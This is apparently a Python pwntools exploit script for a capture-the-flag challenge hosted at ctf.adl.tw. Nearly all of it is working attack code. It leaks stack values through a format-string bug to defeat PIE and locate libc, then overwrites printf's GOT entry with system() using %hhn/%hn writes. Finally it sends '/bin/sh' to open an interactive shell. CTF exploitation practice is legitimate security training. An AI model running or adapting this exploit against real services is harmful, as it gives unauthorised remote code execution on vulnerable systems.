from pwn import *
from time import sleep

r = remote("ctf.adl.tw", 11008)
# r = remote("127.0.0.1", 8888)

def my_send(data):
	r.send(data)
	sleep(0.3)

def my_recv():
	data = r.recv()
	sleep(0.3)
	return data

printf_got_off = 0x201020
system_off = 0x45390

# raw_input('aaa')

# leak pie and get printf_got
my_send("%14$p")
pie = int(my_recv(), 16) - 0x8a0
printf_got = pie + printf_got_off

# leak libc and get system()
my_send("%15$p")
libc = int(my_recv(), 16) - 0x20830
system = libc + system_off

# overwrite printf_got with system()
payload = "%{}c%10$hhn%{}c%11$hn".format((system & 0xff), ((system >> 8) & 0xffff) - (system & 0xff)).ljust(0x20) + p64(printf_got) + p64(printf_got + 1)
my_send(payload)
my_recv()

# print("/bin/sh\x00) => system("/bin/sh\x00")
my_send("/bin/sh\x00")

r.interactive()

